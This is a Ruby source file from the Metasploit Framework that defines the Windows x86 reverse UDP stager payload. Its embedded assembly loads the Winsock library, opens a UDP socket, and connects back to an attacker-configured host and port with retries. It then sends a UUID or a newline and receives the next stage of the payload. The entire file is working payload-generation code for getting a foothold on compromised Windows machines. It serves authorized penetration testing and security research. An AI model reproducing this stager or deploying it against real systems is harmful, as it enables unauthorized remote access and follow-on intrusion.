# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/reverse_tcp'

module Msf

###
#
# Complex reverse_udp payload generation for Windows ARCH_X86
#
###

module Payload::Windows::ReverseUdp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows::ReverseTcp

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
      retry_count: datastore['ReverseConnectRetries'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_udp(conf)
  end

  def transport_config(opts={})
    transport_config_reverse_udp(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_udp(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_udp(opts)}
      #{asm_block_recv(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Fixnum] :retry_count Number of retry attempts
  #
  def asm_reverse_udp(opts={})

    retry_count  = [opts[:retry_count].to_i, 1].max
    encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first

    asm = %Q^
      ; Input: EBP must be the address of 'api_call'.
      ; Output: EDI will be the socket for the connection to the server
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

      reverse_udp:
        push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
        push 'ws2_'             ; ...
        push esp                ; Push a pointer to the "ws2_32" string on the stack.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call ebp                ; LoadLibraryA( "ws2_32" )

        mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
        sub esp, eax            ; alloc some space for the WSAData structure
        push esp                ; push a pointer to this stuct
        push eax                ; push the wVersionRequested parameter
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
        call ebp                ; WSAStartup( 0x0190, &WSAData );

      set_address:
        push #{retry_count}     ; retry counter

      create_socket:
        push #{encoded_host}    ; host in little-endian format - #{opts[:host]}
        push #{encoded_port}    ; family AF_INET and port number - #{opts[:port]}
        mov esi, esp            ; save pointer to sockaddr struct

        push eax                ; if we succeed, eax will be zero, push zero for the flags param.
        push eax                ; push null for reserved parameter
        push eax                ; we do not specify a WSAPROTOCOL_INFO structure
        push eax                ; we do not specify a protocol
        inc eax                 ;
        inc eax                 ;
        push eax                ; push SOCK_DGRAM (UDP socket)
        push eax                ; push AF_INET
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
        call ebp                ; WSASocketA( AF_INET, SOCK_DGRAM, 0, 0, 0, 0 );
        xchg edi, eax           ; save the socket for later, don't care about the value of eax after this

      try_connect:
        push 16                 ; length of the sockaddr struct
        push esi                ; pointer to the sockaddr struct
        push edi                ; the socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
        call ebp                ; connect( s, &sockaddr, 16 );

        test eax,eax            ; non-zero means a failure
        jz connected

      handle_connect_failure:
        ; decrement our attempt count and try again
        dec [esi+8]
        jnz try_connect
    ^

    if opts[:exitfunk]
      asm << %Q^
      failure:
        call exitfunk
      ^
    else
      asm << %Q^
      failure:
        push 0x56A2B5F0         ; hardcoded to exitprocess for size
        call ebp
      ^
    end

    asm << %Q^
      ; this  lable is required so that reconnect attempts include
      ; the UUID stuff if required.
      connected:
    ^

    # UDP receivers need to read something from the new socket
    if include_send_uuid
      asm << asm_send_uuid
    else
      asm << asm_send_newline
    end

    asm
  end

  def asm_send_newline
    newline = raw_to_db "\n"
    asm =%Q^
      send_newline:
        push 0                 ; flags
        push #{newline.length} ; length of the newline
        call get_nl_address    ; put newline buffer on the stack
        db #{newline}          ; newline
      get_nl_address:
        push edi               ; saved socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
        call ebp               ; call send
    ^
    asm
  end

end

end
